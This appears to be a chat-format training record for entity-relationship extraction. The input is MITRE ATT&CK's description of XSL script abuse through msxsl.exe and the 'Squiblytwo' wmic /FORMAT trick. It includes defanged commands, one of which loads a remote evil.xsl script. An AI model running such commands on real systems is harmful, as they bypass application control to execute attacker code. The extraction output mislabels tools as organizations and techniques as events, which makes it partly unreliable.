Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>\n######################\nOutput:"}, {"role": "assistant", "content": "(\"entity\"<|>MICROSOFT<|>ORGANIZATION<|>Microsoft is a technology company that developed the XSLT Script and msxsl.exe utility)\n##\n(\"entity\"<|>MSXSL.EXE<|>ORGANIZATION<|>Msxsl.exe is a Microsoft command-line transformation utility binary used to execute XSL files)\n##\n(\"entity\"<|>PENETRATION TESTING LAB<|>ORGANIZATION<|>Penetration Testing Lab is a source that provided information on the use of msxsl.exe for executing malicious scripts)\n##\n(\"entity\"<|>REAQTA<|>ORGANIZATION<|>Reaqta is a cybersecurity company that reported on the use of msxsl.exe in spearphishing attacks)\n##\n(\"entity\"<|>LOLBAS<|>ORGANIZATION<|>LOLBAS (Living Off The Land Binaries and Scripts) is a project that documents the use of legitimate binaries for malicious purposes)\n##\n(\"entity\"<|>WINDOWS MANAGEMENT INSTRUMENTATION<|>ORGANIZATION<|>Windows Management Instrumentation (WMI) is a set of specifications from Microsoft for consolidating the management of devices and applications in a network)\n##\n(\"entity\"<|>SQUIBLYTWO<|>EVENT<|>Squiblytwo is a technique that involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file)\n##\n(\"entity\"<|>SQUIBLYDOO<|>EVENT<|>Squiblydoo is a technique that leverages the Regsvr32 utility to execute scripts)\n##\n(\"relationship\"<|>MICROSOFT<|>MSXSL.EXE<|>Microsoft developed the msxsl.exe utility<|>9)\n##\n(\"relationship\"<|>MICROSOFT<|>WINDOWS MANAGEMENT INSTRUMENTATION<|>Microsoft developed Windows Management Instrumentation<|>9)\n##\n(\"relationship\"<|>MSXSL.EXE<|>PENETRATION TESTING LAB<|>Penetration Testing Lab provided information on the use of msxsl.exe for executing malicious scripts<|>7)\n##\n(\"relationship\"<|>MSXSL.EXE<|>REAQTA<|>Reaqta reported on the use of msxsl.exe in spearphishing attacks<|>7)\n##\n(\"relationship\"<|>WINDOWS MANAGEMENT INSTRUMENTATION<|>LOLBAS<|>LOLBAS documented the use of Windows Management Instrumentation for malicious purposes<|>7)\n##\n(\"relationship\"<|>SQUIBLYTWO<|>WINDOWS MANAGEMENT INSTRUMENTATION<|>Squiblytwo involves using Windows Management Instrumentation to invoke scripts<|>8)\n##\n(\"relationship\"<|>SQUIBLYDOO<|>WINDOWS MANAGEMENT INSTRUMENTATION<|>Squiblydoo is a counterpart technique to Squiblytwo, leveraging a different Windows tool<|>6)\n<|COMPLETE|>"}]}
